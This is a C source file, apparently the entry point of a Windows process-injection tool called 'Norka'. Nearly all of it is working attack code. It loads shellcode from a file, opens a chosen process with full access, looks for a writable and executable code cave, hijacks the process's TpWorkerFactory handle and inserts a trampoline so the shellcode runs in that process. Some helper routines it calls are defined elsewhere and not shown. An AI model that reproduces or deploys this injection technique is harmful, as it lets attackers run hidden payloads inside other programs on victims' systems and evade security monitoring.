#include <Windows.h>
#include <stdio.h>
#include "common.h"
#include "structs.h"

NT_API g_nt = { 0 };

BOOL initNtApi() { 
	g_nt.pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	g_nt.pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	g_nt.pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
	g_nt.pNtQueryObject = (_NtQueryObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryObject");
	g_nt.pNtQueryInformationWorkerFactory = (_NtQueryInformationWorkerFactory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationWorkerFactory");
	g_nt.pNtSetInformationWorkerFactory = (_NtSetInformationWorkerFactory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationWorkerFactory");
	g_nt.pNtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");

	if (g_nt.pNtQueryInformationProcess != NULL && g_nt.pNtWriteVirtualMemory != NULL && g_nt.pNtReadVirtualMemory != NULL 
	    && g_nt.pNtQueryObject != NULL && g_nt.pNtQueryInformationWorkerFactory != NULL && g_nt.pNtSetInformationWorkerFactory != NULL){
			return TRUE;
		}

	return FALSE;	
}

LPVOID ReadFromDisk(LPCWSTR binFile, SIZE_T* fileSize){

	PVOID buffer = NULL;
	DWORD bytesRead = NULL;
	HANDLE hFile = NULL;

	hFile = CreateFileW(binFile, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0);
	if(hFile == INVALID_HANDLE_VALUE){
		printf("[!] CreateFileA failed with error : %d\n", GetLastError());
		return NULL;
	}

	*fileSize = GetFileSize(hFile, 0);
	buffer = (PBYTE)LocalAlloc(LPTR, *fileSize);

	ReadFile(hFile, buffer, *fileSize, &bytesRead, 0);
	CloseHandle(hFile);

	return buffer;
}

int wmain(int argc, wchar_t* argv[]) {

	DWORD						pid					= 0;
	HANDLE						hProcess			= NULL;
	PVOID						shellcodeAddress	= NULL;
	PVOID						shellcode		    = NULL;
	SIZE_T						shellcodeSize    	= NULL;

	if (argc < 3) {
		printf("[!] Not enough arguments\n[i] Usage:\n	`----> .\\Norka.exe <shellcode.bin> <pid>");
		return -1;
	}

	if (!initNtApi()) {
		printf("[!] initNtApi failed\n");
		return -1;
	}

	shellcode = ReadFromDisk(argv[1], &shellcodeSize);

	pid = wcstoul(argv[2], NULL, NULL);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	printf("[+] Got process handle\n `---> pid : %d\n `---> Handle ID : 0x%X\n", pid, hProcess);

	printf("[i] Searching for RWX code cave ...\n");
	if(!Norka(hProcess, shellcodeSize, shellcode, &shellcodeAddress)){
		printf("[!] Norka failed\n");
		return -1;
	}
	
	printf("[i] Hijacking handle ...\n");
	HANDLE hHijackHandle = HijackProcessHandle(L"TpWorkerFactory", hProcess, WORKER_FACTORY_ALL_ACCESS);
	printf("[+] Successfully hijacked handle\n `---> Handle ID : 0x%X\n", hHijackHandle);

	printf("[i] Inserting trampoline to worker factory start routine ...\n");
	if (!InjectStartRoutine(hProcess, hHijackHandle, shellcodeAddress)) {
		printf("[!] failed to hijack worker\n");
		return -1;
	}

	printf("[+] Done, quitting");

	return 0;
}
